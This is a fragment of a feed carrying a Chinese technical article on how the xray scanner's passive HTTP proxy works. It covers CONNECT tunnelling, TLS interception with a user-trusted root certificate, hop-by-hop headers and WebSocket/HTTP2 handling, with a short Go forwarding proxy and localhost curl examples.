class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;xray项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/chaitin/xray&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/xray&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;官方QQ群：717365081&lt;/p&gt;&lt;p&gt;官方微信：添加微信号chanyo1016，加xray官方运营，会把大家拉到&lt;b&gt;xray官&lt;/b&gt;方微信群。&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-09-27-84486194</guid>
<pubDate>Fri, 27 Sep 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>HTTP被动扫描代理的那些事</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-09-16-82711934.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/82711934&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9d63afb975b5674543a7d68f2f83c41d_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;HTTP 代理这个名词对于安全从业人员应该都是熟知的，我们常用的抓包工具 burp 就是通过配置 HTTP 代理来实现请求的截获修改等。然而国内对这一功能的原理类文章很少，有的甚至有错误。笔者在做 xray 被动代理时研究了一下这部分内容，并整理成了这篇文章，这篇文章我们从小白的角度粗略的聊聊 HTTP 代理到底是如何工作的，在实现被动扫描功能时有哪些细节需要注意以及如何科学的处理这些细节。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;开始之前我先来一波灵魂6问，读者可以先自行思考下，这些问题将是本文的关键点，并将在文章中一一解答：&lt;/p&gt;&lt;blockquote&gt;1.http_proxy 和 https_proxy 有什么区别?&lt;br/&gt;2.为什么需要信任证书才能扫描 HTTPS 的站点?&lt;br/&gt;3.代理 HTTPS 的站点一定需要信任证书吗?&lt;br/&gt;4.代理的隧道模式下如何区分是不是 TLS 的流量?&lt;br/&gt;5.代理应如何处理 Websocket 和 HTTP2 的流量?&lt;br/&gt;6.是否应该复用连接以及如何复用连接？&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;知识储备&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在本地做开发时，有时会需要启动一个 HTTPS 的服务，通常使用 OpenSSL 自行签发证书并在系统中信任该证书，然后就可以正常使用这个 TLS 服务了。如果没有信任，浏览器就会提示证书不信任而无法访问，简言之，我们需要手动信任自行签发的证书才可以正常访问配置了该证书的网站。那么问题来了，为什么平日访问的那些网站都不需要信任证书呢?打开 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 查看其证书发现这里其实是一个证书链:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;666&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-8f0fb27fc46b7428c10cdaa8caa42dea_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;最顶层的 Global Sign RootCA 是一个根证书，第二个是一个中间证书，最后一个才是 baidu 的颁发证书，这三种证书的效力是:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;RootCA &amp;gt;  Intermediates CA &amp;gt; End-User Cert&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而且只要信任了 RootCA 由 RootCA 签发的包括其下级签发的证书都会被信任。而 Global Sign RootCA等是一些默认安装在系统和浏览器中的根证书。这些证书由一些权威机构来维护，可以确保证书的安全和有效性。而内置的这些根证书就允许我们访问一些公共的网站而无需手动信任证书了。&lt;/p&gt;&lt;p&gt;再来说下与 HTTP 代理相关的两个环境变量: HTTP_PROXY 和 HTTPS_PROXY，有的程序使用的是小写的，比如 curl。对于这两个变量，&lt;b&gt;约定俗称&lt;/b&gt;的规则如下:&lt;/p&gt;&lt;blockquote&gt;1.如果目标是 HTTP 的，则使用 HTTP_PROXY 中的地址&lt;br/&gt;2.如果目标是 HTTPS 的，则使用 HTTPS_PROXY 中的地址&lt;br/&gt;3.如果对应的环境变量为空，则不使用代理&lt;/blockquote&gt;&lt;p&gt;这两个环境变量的值是一个 URI，常见的有如下三种形式:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://127.0.0.1:7777

https://127.0.0.1:7777

socks5://127.0.0.1:7777&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抛开与主题无关的 socks 不管，这里又有一个 http 和 https，别晕，这里的 http 和 https 指的是代理服务器的类型，类似 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://baidu.com&lt;/a&gt;&lt;/u&gt; 和 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://baidu.com&lt;/a&gt;&lt;/u&gt; 一个是裸的 HTTP 服务，一个套了一层 TLS 而已。那么组合一下就有 4 种情况了:&lt;/p&gt;&lt;blockquote&gt;1.http_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;2.https_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;http://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;3.http_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;4.https_proxy=&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//127.0.0.1%3A7777/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://127.0.0.1:7777&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;&lt;p&gt;这四种情况都是合法的，也是代理实现时应该考虑的。但是如上面所说，这只是约定俗称的，没有哪个 RFC 规定必须这样做，导致上面四种情况在常见的工具中被实现的五花八门，为了避免把大家绕晕，我直接说结论：很多工具对后面两种不支持，比如 wget, python requests, 也就是说 https://还是被当成了 http://，因此我们这里只讨论前两种情况的实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;代理中的 MITM&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;HTTP 代理的协议基于 HTTP，因此 HTTP 代理本身就是一个 HTTP 的服务，而其工作原理本质上就是中间人（MITM) ，即读取当前客户端的 HTTP 请求，从代理发送出去并获得响应，然后将响应返回给客户端。其过程类似下面的流程:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;219&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;219&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-9525e7afac8f0361e8e680d43933a867_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;为了更直观的感受下，可以用 nc 监听 127.0.0.1:7777 然后使用&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http_proxy=http://127.0.0.1:7777 curl http://example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;会发现 nc 的数据包为:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;GET http://example.com/ HTTP/1.1
Host: example.com
Proxy-Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) 
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看起来和 HTTP 的请求非常像，唯一的区别就是 GET 后的是一个完整的 URI，而不是 path，这主要是方便代理得到客户端的原始请求，如果不用完整的 URI，请求的 Scheme 将无从得知，端口号有时也可能是不知道的。&lt;/p&gt;&lt;p&gt;在 Go 中我们可以用几行简单的代码实现这种场景下的代理。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;package main
import (
   &amp;#34;bufio&amp;#34;   
    &amp;#34;log&amp;#34;   
    &amp;#34;net&amp;#34;   
    &amp;#34;net/http&amp;#34;
)
var client = http.Client{}
func main() {
   listener, err := net.Listen(&amp;#34;tcp&amp;#34;, &amp;#34;127.0.0.1:7777&amp;#34;)
   if err != nil {
      log.Fatal(err)
   }
   for {
      conn, err := listener.Accept()
      if err != nil {
         log.Fatal(err)
      }
      go handleConn(conn)
   }
}
func handleConn(conn net.Conn) {
   // 读取代理中的请求   req, err := http.ReadRequest(bufio.NewReader(conn))
   if err != nil {
      log.Println(err)
      return   }
   req.RequestURI = &amp;#34;&amp;#34;   // 发送请求获取响应   resp, err := client.Do(req)
   if err != nil {
      log.Println(err)
      return   }
   // 将响应返还给客户端   _ = resp.Write(conn)
   _ = conn.Close()
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;编译运行这段代码，然后使用 curl 测试下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http_proxy=http://127.0.0.1:7777  curl -v http://example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;代理看起来工作正常，我们使用不到 40 行代码就实现了一个简易的 HTTP 代理！代码中的 req 就是做被动代理扫描需要用到的请求，把请求复制一份扔给扫描器就可以了。这也就是上面说的第一种情况， 即http_proxy=http://。那么如果直接使用上述实现访问 https 的站点会发生什么呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;TLS 与隧道代理&lt;/b&gt;&lt;/h2&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;https_proxy=http://127.0.0.1:7777 curl -v https://baidu.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用上面的方式访问 baidu 时，出现了比较奇怪的事情——通过代理读到的客户端请求不是原来的请求，而是一个 CONNECT 请求:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;CONNECT baidu.com:443 HTTP/1.1
Host: baidu.com:443
User-Agent: curl/7.54.0
Proxy-Connection: Keep-Alive&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是 HTTP 代理的另一种形式，称为隧道代理。隧道代理的过程如下:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;239&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;690&quot; data-original=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;239&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;690&quot; data-original=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-72dddb8411f75213ca24bfe862b79631_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;隧道代理的出现是为了能在 HTTP 协议基础上传输非 HTTP 的内容。如果你用过 websocket，一定对 Connection: Upgrade 这个头不陌生。这个头是用来告诉 server，客户端想把当前的 HTTP 的连接转为 Websocket 协议通信的连接。类似的，这里的 CONNECT是一种协议转换的请求，但这种转换更像是一种 Degrade，因为握手完成后，这个链接将退化为原始的 Socket Connection，可以在其中传输任意数据。用文字描述下整个过程如下:&lt;/p&gt;&lt;blockquote&gt;1. 客户端想通过代理访问&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//baidu.com/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://baidu.com&lt;/a&gt;&lt;/u&gt;，向代理发送 Connect 请求。&lt;br/&gt;2. 代理尝试连接 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com%3A443&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com:443&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;，如果连接成功返回一个 200 响应，连接控制权转交个客户端；如果连接失败返回一个 502，连接中止。&lt;br/&gt;3. 客户端收到 200 后，在这个连接中进行 TLS 握手，握手成功后进行正常的 HTTP 传输。&lt;/blockquote&gt;&lt;p&gt;有个点需要注意下，转换后的连接是可以传输任意数据的，并非只是 HTTPS 流量，可以是普通的 HTTP流量，也可以是其他的应用层的协议流量。那么我们回到被动代理扫描这个话题，如何获取隧道代理中的请求并用来扫描？&lt;/p&gt;&lt;p&gt;这是一个比较棘手的问题，正是由于隧道中的流量可以是任意应用层协议的数据，我们无法确切知道隧道中流量用的哪种协议，所以只能猜一下。查看 TLS 的 RFC 可以发现，TLS 协议开始于一个字节 0×16，这个字节在协议中被称为 ClientHello，那么我们其实就可以根据这第一个字节将协议简单区分为 TLS 流量和非 TLS 流量。对于被动扫描器而言，为了简单起见，我们认为 TLS 的流量就是 HTTPS 流量，非 TLS 流量就是 HTTP 流量。后者和普通代理下的 MITM 一致，可以直接复用代码，而 HTTPS 的情况需要多一个 TLS 握手的过程。用伪代码表示就是:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;b = conn.Read(1)
if b == &amp;#34;0x16&amp;#34; {
	tlsHandShake(conn)
} 
req = readRequest(conn)
handleReq(conn, req)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里有个细节是读出的这一个字节不要忘记“塞回去”，因为少了一个字节，后面的会操作会失败。&lt;/p&gt;&lt;p&gt;这里我们需要重点关注下 TLS 握手过程。在 TLS 握手过程中会进行证书校验，如果客户端访问的是 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;，server 需要有 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 这个域的公钥和私钥才能完成握手，可是我们手里哪能有 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//baidu.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;baidu.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;的证书（私钥），那个在文件在 baidu 的服务器上呢！&lt;/p&gt;&lt;p&gt;解决办法就是文章最开始说到的信任根证书。&lt;b&gt;信任根证书后，我们可以在 TLS 握手之前直接签发一个对应域的证书来进行 TLS 握手&lt;/b&gt;，这就是包括 burp 在内的所有需要截获 HTTPS 数据包的软件都需要信任一个根证书的原因！有了被系统信任的根证书，我们就可以签出任意的被客户系统信任的具体域的证书，然后就可以剥开 TLS 拿到被动扫描需要的请求了。这里还有一个小问题是签发的证书的域该使用哪个，简单起见我们可以直接使用 CONNECT 过程中的地址，更科学的方法我们后面说。签完证书就可以完成 TLS 握手，然后就又和第一节的情况类似了。&lt;/p&gt;&lt;p&gt;有个点需要提一下，如果不需要进行中间人获取客户端请求，是不需要信任证书的，因为这种情况下的是真正的隧道，像是客户端与服务器的直接通信，代理服务器仅仅在做二进制的数据转发。&lt;/p&gt;&lt;p&gt;至此，被动代理的核心实现已经完成了，接下来是一些琐碎的细节，这些细节同样值得注意。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;代理的认证&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;一个公网的代理如果没有加认证是比较危险的，因为代理本身就相当于开放了某个网络的使用权限，而且由于隧道模式的存在，代理的支持的协议理论上拓宽到了任何基于 TCP 的协议，如果可以和传统的 redis 未授权，SSRF DNS rebinding 等结合一下就是一个简单的 CTF 题。所以给代理加上鉴权是很有必要的。&lt;/p&gt;&lt;p&gt;代理的认证和正常的 HTTP Basic Auth 很像，只是相关头加了一个 Proxy- 的前缀，可以参考 《HTTP 权威指南》中的一个图学习一下:&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;u&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;484&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;484&quot; data-original=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;484&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;484&quot; data-original=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;点对点的修正&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;根据 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/draft-ietf-httpbis-p1-messaging-14%23section-7.1.3.1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;RFC&lt;/a&gt;&lt;/u&gt;，HTTP 中的下列头被称为单跳头(Hop-By-Hop header)，这些 Header 应该只作用于单个 TCP 连接的两端，HTTP 代理在请求中如果遇到了，应当删掉这些头。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;#34;Proxy-Authenticate&amp;#34;,
&amp;#34;Proxy-Authorization&amp;#34;,
&amp;#34;Connection&amp;#34;,
&amp;#34;Keep-Alive&amp;#34;,
&amp;#34;Proxy-Connection&amp;#34;, 
&amp;#34;Te&amp;#34;,
&amp;#34;Trailer&amp;#34;,
&amp;#34;Transfer-Encoding&amp;#34;,
&amp;#34;Upgrade&amp;#34;,&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至于这些头要删掉的原因，这里按我的理解简单说下。前两个是和认证相关的，每个代理的认证是独立的，所以认证成功应该删掉当前代理的认证信息。&lt;/p&gt;&lt;p&gt;中间的三个是用于控制连接状态的，TCP 连接是端到端的，连接状态的维护也应该是针对两端的，即客户端与代理服务器， 代理服务器与目的服务器应该是分别维护各自状态的。Proxy-Connection 类似 Connection，是用来指定客户端和代理之间的连接是不是 KeepAlive 的，代理实现时应该兼顾这个要求。对于连接的状态管理，我认为比较科学的方式是&lt;b&gt;分拆而后串联&lt;/b&gt;。分拆是说 client-&amp;gt;proxy 和 proxy -&amp;gt; server 这两个过程&lt;b&gt;分开&lt;/b&gt;处理， client-&amp;gt;proxy 的过程每次开启新的 TCP 连接，不做连接复用；而 proxy-&amp;gt;server 的过程本质上就是一个普通的 http 请求，所以可以套一个连接池，借助连接池可以复用 TCP 连接。两部分的连接都拨通后，可以将其&lt;b&gt;串联&lt;/b&gt;起来，最终效果上就是在遵循 Proxy-Connection 的前提下连接的状态最终与代理无关，而是由 client 和 server 共同控制。串联过程在 Go 中可以用两行代码简单搞定:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;go io.Copy(conn1, conn2)
io.Copy(conn2, conn1)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;TE Trailer Transfer-Encoding和请求传输的方式有关。代理在读取客户端请求时应该确保正确处理了 chunked 的传输方式后再删除这几个头，由代理自行决定在发往目的服务器时要不要使用分块传输。类似的还有 Content-Encoding，这个决定的是请求的压缩方式，也应该在代理端被科学的处理掉。好在传输方式这几个头在 Go 的标准库中都有实现，对开发者基本都是透明的，开发者可以直接使用而无需关心具体的逻辑。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Websocket 与 HTTP2&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;前面提到过 Upgrade，这里再简单说说。这个头常用于从 HTTP 转换到 Websocket 或 HTTP2 协议。对于 Websocket，被动扫描时可以不关注，所以可以直接放行。这里放行的意思是不再去解析，而是类似 Tunnel 那种，单纯的进行数据转发。对于 HTTP2 ，我们可以拒绝这一转换，使得数据协议始终用 HTTP，也算是一个偷懒的捷径。&lt;/p&gt;&lt;p&gt;当然，如果想要做的完善些，就需要套用一下这两种协议的解析，伪装成 Websocket server 或 HTTP2 server，然后做中间人去获取传输数据，有兴趣可以看一下 Python 的 MitmProxy 的实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;离完美的差距&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回顾刚才说的一些要点，这里的被动代理实现其实并不完美，主要有这两点:&lt;/p&gt;&lt;p&gt;第一点是隧道模式下，我们强行判定了以 0×16 开头的就是 TLS 流量，协议千千万，这种可能有误判的。其次我们认为 TLS 层下的应用协议一定是 HTTP，这也是不妥的，但对于被动扫描这种场景是足够了。&lt;/p&gt;&lt;p&gt;另一点是隧道模式下证书的签发流程不够完美。如果你用过虚拟主机，或者尝试过在同一地址同一端口上运行多个 HTTP 服务，那一定知道 nginx 中的 server_name 或是 apache 的 VirtualHost。服务器收到 HTTP 请求后会去查看请求的 Host 字段，以此决定使用哪个服务。TLS 模式下有所不同，因为 TLS 握手时服务器没法读取请求，为此 TLS 有个叫 SNI（Server Name Indication）的拓展解决了这个问题，即在 TLS 握手时发送客户端请求的域给服务器，使得在同一 ip 同一端口上运行多个 TLS 服务成为了可能。回到被动代理这，之前我们签证书用的域是从 CONNECT 的 HOST 中获取的，其实更好的办法是从 TLS 的握手中读取，这样就需要自行实现 TLS 的握手过程了，具体可以参考下 MitmProxy 的实现。 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//docs.mitmproxy.org/stable/concepts-howmitmproxyworks/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;docs.mitmproxy.org/stab&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;le/concepts-howmitmproxyworks/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后话&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;零零散散说了好多，一个看似简单的 HTTP 代理实则暗藏各种玄机。在所有我见过的被动代理中，Python 的 MitmProxy 是实现的最全面最科学的，如果你想使用二而不关心其中的细节，推荐大家使用这个库。截止到这篇文章发布，在 Go 中暂时还没有类似 MitmProxy 那般完善的实现，于是我们在写 xray 被动扫描代理的时候参考了几个开源的项目并调整了一下，达到了我认为能用的状态。如果我有时间，一定要整一个Go 版的 MitmProxy! (咕咕咕&lt;/p&gt;&lt;p&gt;有一些代码层面的细节没法写到，凡事都要身体力行才能得到一些独到的理解，大家有时间可以亲自尝试下，相信会有不一样的收获。一家之谈，难免有疏漏和谬误，如果发现有问题，可以在评论处指正，或者和我微信交流下: emVtYWw2NjY=。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//tools.ietf.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;RFC&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//docs.mitmproxy.org/stable/concepts-howmitmproxyworks/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;How mitmproxy works&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/google/martian&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span 